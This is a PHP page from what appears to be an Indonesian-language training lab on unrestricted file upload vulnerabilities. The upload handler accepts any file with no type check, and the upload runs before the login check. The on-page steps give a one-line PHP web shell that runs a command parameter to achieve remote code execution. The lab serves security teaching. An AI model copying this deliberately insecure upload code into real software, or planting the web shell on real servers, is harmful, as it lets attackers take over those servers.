<?php
session_start();
$base_path = '../../';
include '../../db.php';

$upload_dir = "uploads/";
if (!is_dir($upload_dir)) mkdir($upload_dir);

$msg = "";
$uploaded_file = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $target_file = $upload_dir . $filename;
    
    // VULNERABLE: No strict check on extension (only checks if image for getimagesize, but typical unsecure upload might rely on mime type or just allow anything)
    // We will allow EVERYTHING for this educational lab to demonstrate "Unrestricted File Upload"
    // Usually one uploads a PHP Shell.
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $msg = "<div class='alert alert-success'>File berhasil diupload!</div>";
        $uploaded_file = $target_file;
    } else {
        $msg = "<div class='alert alert-error'>Gagal upload file.</div>";
    }
}

if (!isset($_SESSION['user_id'])) {
    header("Location: ../../login.php");
    exit;
}

include '../../includes/header.php';
?>

<div class="card">
    <div class="module-header" style="background: linear-gradient(135deg, #14b8a6, #0f766e);">
        <h1>📤 File Upload Vulnerability</h1>
        <p>Kerentanan paling berbahaya: Memungkinkan penyerang mengupload Backdoor / Web Shell.</p>
    </div>

    <div class="alert alert-info">
        <strong>📚 Langkah Percobaan:</strong>
        <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
            <li>Buat file PHP sederhana bernama <code>shell.php</code> isinya: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
            <li>Upload file tersebut di form di bawah ini.</li>
            <li>Setelah berhasil, klik link file yang muncul.</li>
            <li>Akses shell tersebut dengan parameter cmd: <code>uploads/shell.php?cmd=whoami</code></li>
            <li>Jika sukses, Anda telah mengambil alih server sepenuhnya (RCE).</li>
        </ol>
    </div>

    <div style="background: var(--background); padding: 1.5rem; border-radius: var(--radius); border: 1px solid var(--border);">
        <h3>Upload Gambar Profil</h3>
        <?= $msg ?>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required style="margin-bottom: 1rem;">
            <button type="submit" class="btn">Upload</button>
        </form>

        <?php if ($uploaded_file): ?>
            <div style="margin-top: 1rem;">
                <p>File Anda tersimpan di:</p>
                <a href="<?= $uploaded_file ?>" target="_blank" class="btn btn-secondary"><?= $uploaded_file ?></a>
            </div>
        <?php endif; ?>
    </div>
</div>

<?php include '../../includes/footer.php'; ?>
